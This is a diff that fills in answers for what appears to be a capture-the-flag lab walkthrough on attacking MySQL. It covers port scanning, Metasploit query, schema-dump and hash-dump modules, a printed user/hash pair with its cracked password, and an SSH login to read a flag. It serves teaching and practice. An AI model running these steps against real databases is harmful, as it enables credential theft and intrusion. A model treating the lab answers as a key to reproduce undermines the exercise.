@@ -208,9 +208,95 @@ Difficulty: Easy
 	
 ## Task 8 - Understanding MySQL
 
+- What type of software is MySQL?
+
+	- `relational database management system`
+
+- What language is MySQL based on?
+
+	- `sql`
+
+- What communication model does MySQL use?
+
+	- `client-server`
+
+- What is a common application of MySQL?
+
+	- `back end database`
+
+- What major social network uses MySQL as their back-end database? This will require further research.
+
+	- `Facebook`
+
 ## Task 9 - Enumerating MySQL
+
+- As always, let's start out with a port scan, so we know what port the service we're trying to attack is running on. What port is MySQL using?
+
+	- `nmap -a -p- <TARGET_IP>`
+	- `3306*`
+
+- Good, now- we think we have a set of credentials. Let's double check that by manually connecting to the MySQL server. We can do this using the command "mysql -h [IP] -u [username] -p"
+
+	  no answer needed
+
+
+- Okay, we know that our login credentials work. Lets quit out of this session with "exit" and launch up Metasploit.
+
+	  no answer needed
+
+- We're going to be using the `mysql_sql` module. Search for, select and list the options it needs. What three options do we need to set? (in descending order).
+
+	- `password/rhosts/username`
+
+- Run the exploit. By default it will test with the "select module()" command, what result does this give you?
+
+	- `*.7.29-0ubuntu0.**.**.*`
+
+- Great! We know that our exploit is landing as planned. Let's try to gain some more ambitious information. Change the "sql" option to "show databases". how many databases are returned?
+
+	- `set sql show databases`
+	- `run`
+	- `*`
 
 ## Task 10 - Exploiting MySQL
 
+- First, let's search for and select the "mysql_schemadump" module. What's the module's full name?
+
+	- `auxiliary/scanner/mysql/mysql_schemadump`
+
+-  Great! Now, you've done this a few times by now so I'll let you take it from here. Set the relevant options, run the exploit. What's the name of the last table that gets dumped?
+
+	- `x$waits_global_by_latency`
+
+- Awesome, you have now dumped the tables, and column names of the whole database. But we can do one better... search for and select the `mysql_hashdump` module. What's the module's full name?
+
+	- `auxiliary/scanner/mysql/mysql_hashdump`
+
+- Again, I'll let you take it from here. Set the relevant options, run the exploit. What non-default user stands out to you?
+
+	- `carl`
+
+- What is the user/hash combination string?
+
+	- `carl:*EA031893AA21444B170FC2162A56978B8CEECE18`
+
+- Now, we need to crack the password! Let's try John the Ripper against it using: "john hash.txt" what is the password of the user we found? 
+
+	- `doggie`
+
+- What's the contents of MySQL.txt
+
+	- `ssh carl@<TARGET_IP>`, `yes` and enter the password.
+	- `ls`
+	- `cat MySQL.txt`
+	- `**********************************************`
+
 ## Task 11 - Further Learning
 
+Reading
+- [](https://web.mit.edu/rhel-doc/4/RH-DOCS/rhel-sg-en-4/ch-exploits.html)
+- [](https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/)
+
+- Congratulations! You did it!
+
+	  no answer needed
